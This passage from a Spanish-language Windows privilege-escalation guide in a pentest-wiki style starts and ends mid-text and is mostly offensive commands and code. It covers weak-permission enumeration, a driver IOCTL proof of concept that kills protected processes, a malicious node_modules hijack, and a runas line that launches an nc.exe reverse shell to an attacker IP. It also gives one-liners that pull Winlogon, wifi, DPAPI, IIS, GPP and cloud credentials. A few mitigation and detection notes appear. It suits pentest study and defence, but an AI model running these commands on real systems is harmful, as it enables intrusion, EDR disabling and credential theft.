dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

Comprueba si puedes modificar algún archivo de configuración para leer algún archivo especial o si puedes modificar algún binario que vaya a ser ejecutado por una cuenta de Administrator (schedtasks).

Una forma de encontrar permisos débiles de carpetas/archivos en el sistema es haciendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ carga automáticamente cualquier DLL de plugin dentro de sus subcarpetas `plugins`. Si hay una instalación portable/copia escribible, dejar caer un plugin malicioso da ejecución automática de código dentro de `notepad++.exe` en cada inicio (incluyendo desde `DllMain` y callbacks del plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Busca posibles drivers de terceros raros/vulnerables
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expone una primitive arbitraria de kernel read/write (común en IOCTL handlers mal diseñados), puedes escalar robando directamente un token de SYSTEM desde la memoria del kernel. Ve la técnica paso a paso aquí:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race-condition donde la llamada vulnerable abre una ruta de Object Manager controlada por el atacante, ralentizar deliberadamente la búsqueda (usando componentes de longitud máxima o cadenas de directorios profundas) puede estirar la ventana de microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Las vulnerabilidades modernas de hive permiten preparar layouts deterministas, abusar de descendientes HKLM/HKU escribibles y convertir corrupción de metadata en kernel paged-pool overflows sin un custom driver. Aprende la cadena completa aquí:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Algunos drivers aceptan una ruta de registry desde userland, validan solo que sea una cadena UTF-16 válida y luego llaman `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` hacia un scalar de stack como `int readValue`. Si falta `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se interpreta según el tipo de registry **real**, no según el tipo que el developer esperaba.

Esto crea dos primitives útiles:

- **Confused deputy / oracle**: una ruta absoluta `\Registry\...` controlada por el usuario permite que el driver consulte keys elegidas por el atacante, filtre existencia mediante return codes/logs y, a veces, lea valores a los que el caller no podría acceder directamente.
- **Kernel memory corruption**: un destino scalar como `&readValue` pasa a estar type-confused como un `REG_QWORD`, `UNICODE_STRING` o un buffer binario de tamaño variable según el tipo de valor del registry.

Notas prácticas de explotación:

- **Mitigación de Windows 8+**: si la consulta toca un **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT` pero sin `RTL_QUERY_REGISTRY_TYPECHECK`, los kernel callers fallan con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para mantener la explotabilidad, busca **keys escribibles por el atacante dentro de trusted system hives** en lugar de preparar valores bajo `HKCU`.
- **Trusted-hive staging**: usa NtObjectManager para enumerar descendientes escribibles de `\Registry\Machine`, y vuelve a ejecutar el escaneo con un token duplicado de **low-integrity** para encontrar keys accesibles desde contextos sandboxed:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: una escritura directa de 8 bytes en un `int` de 4 bytes corrompe datos adyacentes de la pila y puede sobrescribir parcialmente un callback/function pointer cercano.
- **`REG_SZ` / `REG_EXPAND_SZ`**: el modo directo espera que `EntryContext` apunte a un `UNICODE_STRING`. Si el código primero carga un `REG_DWORD` controlado por el atacante en un escalar de pila y luego reutiliza ese mismo buffer para una lectura de string, el atacante controla `Length`/`MaximumLength` e influye parcialmente en el puntero `Buffer`, produciendo una escritura de kernel semicontrolada.
- **`REG_BINARY`**: para datos binarios grandes, el modo directo trata el primer `LONG` en `EntryContext` como un tamaño de buffer con signo. Si una lectura previa de `REG_DWORD` deja un valor **negativo** controlado por el atacante en el escalar reutilizado, la siguiente consulta `REG_BINARY` copia bytes del atacante directamente sobre slots adyacentes de la pila, lo que a menudo es la ruta más limpia para sobrescribir por completo un callback-pointer.

Patrón fuerte de hunting: **lecturas heterogéneas del registro en la misma variable de pila sin re-inicializarla**. Busca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, punteros `EntryContext` reutilizados, y rutas de código donde la primera lectura del registro controla si ocurre una segunda lectura.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Algunos drivers firmados de terceros crean su device object con un SDDL fuerte mediante IoCreateDeviceSecure pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin este flag, la DACL segura no se aplica cuando el device se abre a través de una ruta que contiene un componente extra, permitiendo que cualquier usuario sin privilegios obtenga un handle usando una ruta de namespace como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una vez que un usuario puede abrir el device, los IOCTLs privilegiados expuestos por el driver pueden ser abusados para LPE y tampering. Capacidades de ejemplo observadas en el mundo real:
- Devolver handles de acceso completo a procesos arbitrarios (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura raw de disco sin restricciones (offline tampering, boot-time persistence tricks).
- Terminar procesos arbitrarios, incluyendo Protected Process/Light (PP/PPL), permitiendo AV/EDR kill desde user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigaciones para desarrolladores
- Siempre establece FILE_DEVICE_SECURE_OPEN al crear objetos de dispositivo destinados a ser restringidos por un DACL.
- Valida el contexto del caller para operaciones privilegiadas. Agrega comprobaciones PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringe los IOCTLs (access masks, METHOD_*, validación de input) y considera modelos brokered en lugar de privilegios directos del kernel.

Ideas de detección para defenders
- Monitorea opens en user-mode de nombres de device sospechosos (p. ej., \\ .\\amsdk*) y secuencias específicas de IOCTL que indiquen abuso.
- Aplica la vulnerable driver blocklist de Microsoft (HVCI/WDAC/Smart App Control) y mantén tus propias listas allow/deny.


## PATH DLL Hijacking

Si tienes **write permissions dentro de una carpeta presente en PATH** podrías ser capaz de hijackear una DLL cargada por un proceso y **escalar privilegios**.

Comprueba los permisos de todas las carpetas dentro de PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para más información sobre cómo abusar de esta comprobación:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Secuestro de resolución de módulos de Node.js / Electron mediante `C:\node_modules`

Esta es una variante de **Windows uncontrolled search path** que afecta a aplicaciones de **Node.js** y **Electron** cuando realizan una importación directa como `require("foo")` y el módulo esperado **falta**.

Node resuelve paquetes subiendo por el árbol de directorios y comprobando carpetas `node_modules` en cada directorio padre. En Windows, ese recorrido puede llegar a la raíz de la unidad, así que una aplicación lanzada desde `C:\Users\Administrator\project\app.js` puede terminar probando:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **usuario con pocos privilegios** puede crear `C:\node_modules`, puede colocar un `foo.js` malicioso (o una carpeta de paquete) y esperar a que un **proceso de Node/Electron con más privilegios** resuelva la dependencia faltante. El payload se ejecuta en el contexto de seguridad del proceso víctima, así que esto se convierte en **LPE** cuando el objetivo se ejecuta como administrador, desde una tarea programada elevada/service wrapper, o desde una aplicación de escritorio privilegiada iniciada automáticamente.

Esto es especialmente común cuando:

- una dependencia está declarada en `optionalDependencies`
- una biblioteca de terceros envuelve `require("foo")` en `try/catch` y continúa si falla
- un paquete fue eliminado de las compilaciones de producción, omitido durante el empaquetado o no se instaló correctamente
- el `require()` vulnerable está muy dentro del árbol de dependencias en lugar de en el código principal de la aplicación

### Buscar objetivos vulnerables

Usa **Procmon** para demostrar la ruta de resolución:

- Filtra por `Process Name` = ejecutable objetivo (`node.exe`, el EXE de la app Electron, o el proceso wrapper)
- Filtra por `Path` `contains` `node_modules`
- Concéntrate en `NAME NOT FOUND` y en la apertura final exitosa bajo `C:\node_modules`

Patrones útiles de revisión de código en archivos `.asar` desempaquetados o en el código fuente de la aplicación:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifica el **nombre del paquete faltante** con Procmon o revisando el código fuente.
2. Crea el directorio raíz de búsqueda si todavía no existe:
```powershell
mkdir C:\node_modules
```
3. Drop un módulo con el nombre exacto esperado:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Activa la aplicación víctima. Si la aplicación intenta `require("foo")` y el módulo legítimo no está presente, Node puede cargar `C:\node_modules\foo.js`.

Ejemplos reales de módulos opcionales faltantes que encajan con este patrón incluyen `bluebird` y `utf-8-validate`, pero la **técnica** es la parte reutilizable: encuentra cualquier **bare import** faltante que un proceso privilegiado de Windows Node/Electron resuelva.

### Ideas de detección y hardening

- Alertar cuando un usuario crea `C:\node_modules` o escribe nuevos archivos/paquetes `.js` allí.
- Buscar procesos de alta integridad leyendo desde `C:\node_modules\*`.
- Empaquetar todas las dependencias de runtime en producción y auditar el uso de `optionalDependencies`.
- Revisar código de terceros en busca de patrones silenciosos `try { require("...") } catch {}`.
- Desactivar las comprobaciones opcionales cuando la biblioteca lo permita (por ejemplo, algunas implementaciones de `ws` pueden evitar la comprobación heredada `utf-8-validate` con `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Comprueba si hay otros equipos conocidos codificados en el archivo hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de red & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Puertos abiertos

Comprueba los **restricted services** desde el exterior
```bash
netstat -ano #Opened ports?
```
### Tabla de rutas
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabla ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reglas del Firewall

[**Consulta esta página para comandos relacionados con Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para enumeración de red aquí](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` también se puede encontrar en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto te preguntará mediante GUI si se debe permitir `nc` por el firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar fácilmente `bash` como root, puedes probar `--default-user root`

Puedes explorar el filesystem de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault almacena credenciales de usuario para servidores, sitios web y otros programas que **Windows** puede **iniciar sesión automáticamente para los usuarios**. A primera vista, esto podría parecer que ahora los usuarios pueden almacenar sus credenciales de Facebook, credenciales de Twitter, credenciales de Gmail, etc., para que inicien sesión automáticamente a través de los navegadores. Pero no es así.

Windows Vault almacena credenciales con las que Windows puede iniciar sesión automáticamente para los usuarios, lo que significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede hacer uso de este Credential Manager** y Windows Vault y usar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña todo el tiempo.

A menos que las aplicaciones interactúen con Credential Manager, no creo que sea posible para ellas usar las credenciales de un recurso dado. Así que, si tu aplicación quiere hacer uso del vault, debería de alguna manera **comunicarse con el credential manager y solicitar las credenciales para ese recurso** desde el vault de almacenamiento predeterminado.

Usa `cmdkey` para listar las credenciales almacenadas en la máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Entonces puedes usar `runas` con la opción `/savecred` para usar las credenciales guardadas. El siguiente ejemplo está llamando a un binario remoto a través de un recurso compartido SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` con un conjunto de credenciales proporcionado.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o desde el [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** proporciona un método para el cifrado simétrico de datos, usado predominantemente dentro del sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado aprovecha un secreto de usuario o de sistema para contribuir significativamente a la entropía.

**DPAPI permite el cifrado de claves mediante una clave simétrica derivada de los secretos de inicio de sesión del usuario**. En escenarios que implican cifrado del sistema, utiliza los secretos de autenticación de dominio del sistema.

Las claves RSA de usuario cifradas, mediante DPAPI, se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, ubicada junto con la master key que protege las claves privadas del usuario en el mismo archivo**, normalmente consta de 64 bytes de datos aleatorios. (Es importante señalar que el acceso a este directorio está restringido, impidiendo listar su contenido mediante el comando `dir` en CMD, aunque sí puede listarse a través de PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puedes usar el **mimikatz module** `dpapi::masterkey` con los argumentos apropiados (`/pvk` o `/rpc`) para descifrarlo.

Los **credentials files protegidos por la master password** suelen estar ubicados en:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puedes usar el **mimikatz module** `dpapi::cred` con el `/masterkey` apropiado para descifrar.\
Puedes **extraer muchas DPAPI** **masterkeys** de la **memory** con el módulo `sekurlsa::dpapi` (si eres root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Las **PowerShell credentials** se usan a menudo para tareas de **scripting** y automatización como una forma de almacenar credenciales cifradas de manera conveniente. Las credenciales están protegidas usando **DPAPI**, lo que normalmente significa que solo pueden ser descifradas por el mismo usuario en el mismo ordenador en el que fueron creadas.

Para **decrypt** una credencial de PS desde el archivo que la contiene, puedes hacer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos ejecutados recientemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use el módulo **Mimikatz** `dpapi::rdg` con el `/masterkey` المناسب para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchas masterkeys DPAPI** de la memoria con el módulo `sekurlsa::dpapi` de Mimikatz

### Sticky Notes

A menudo, las personas usan la app StickyNotes en Windows workstations para **guardar contraseñas** y otra información, sin darse cuenta de que es un archivo de base de datos. Este archivo se encuentra en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` y siempre vale la pena buscarlo y examinarlo.

### AppCmd.exe

**Ten en cuenta que para recuperar contraseñas de AppCmd.exe necesitas ser Administrator y ejecutarlo bajo un nivel High Integrity.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\
Si este archivo existe, entonces es posible que algunas **credenciales** hayan sido configuradas y puedan ser **recuperadas**.

Este código fue extraído de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Comprueba si existe `C:\Windows\CCM\SCClient.exe` .\
Los instaladores se **ejecutan con privilegios de SYSTEM**, muchos son vulnerables a **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Archivos y Registro (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

Las claves privadas de SSH pueden almacenarse dentro de la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, así que deberías comprobar si hay algo interesante ahí:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si encuentras alguna entrada dentro de esa ruta, probablemente será una clave SSH guardada. Se almacena cifrada, pero puede descifrarse fácilmente usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si el servicio `ssh-agent` no está en ejecución y quieres que se inicie automáticamente al arrancar, ejecuta:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas ssh keys, añadirlas con `ssh-add` e iniciar sesión vía ssh en una máquina. El registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no identificó el uso de `dpapi.dll` durante la autenticación de asymmetric key.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Contenido de ejemplo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciales de Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Cached GPP Pasword

Anteriormente estaba disponible una función que permitía implementar cuentas locales de administrador personalizadas en un grupo de máquinas mediante Group Policy Preferences (GPP). Sin embargo, este método tenía importantes fallos de seguridad. En primer lugar, los Group Policy Objects (GPOs), almacenados como archivos XML en SYSVOL, podían ser accedidos por cualquier usuario del dominio. En segundo lugar, las contraseñas dentro de estos GPPs, cifradas con AES256 usando una clave predeterminada documentada públicamente, podían ser descifradas por cualquier usuario autenticado. Esto suponía un riesgo serio, ya que podía permitir a los usuarios obtener privilegios elevados.

Para mitigar este riesgo, se desarrolló una función para buscar archivos GPP almacenados en caché localmente que contengan un campo "cpassword" que no esté vacío. Al encontrar un archivo así, la función descifra la contraseña y devuelve un objeto personalizado de PowerShell. Este objeto incluye detalles sobre el GPP y la ubicación del archivo, lo que ayuda a identificar y remediar esta vulnerabilidad de seguridad.

Busca en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ estos archivos:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obtener las contraseñas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Ejemplo de web.config con credenciales:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciales de OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
